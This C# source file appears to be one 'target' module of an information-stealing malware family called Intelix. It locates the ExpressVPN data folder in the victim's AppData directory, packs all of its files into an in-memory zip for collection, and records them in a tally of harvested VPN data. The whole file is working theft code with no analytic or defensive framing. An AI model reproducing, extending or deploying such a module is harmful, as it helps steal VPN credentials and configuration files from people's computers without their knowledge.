using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Vpn;

public class ExpressVPN : ITarget
{
	public void Collect(InMemoryZip zip, Counter counter)
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "ExpressVPN");
		if (Directory.Exists(text))
		{
			string text2 = "ExpressVPN";
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "ExpressVPN";
			zip.AddDirectoryFiles(text, text2);
			counterApplications.Files.Add(text + " => " + text2);
			counterApplications.Files.Add(text2);
			counter.Vpns.Add(counterApplications);
		}
	}
}
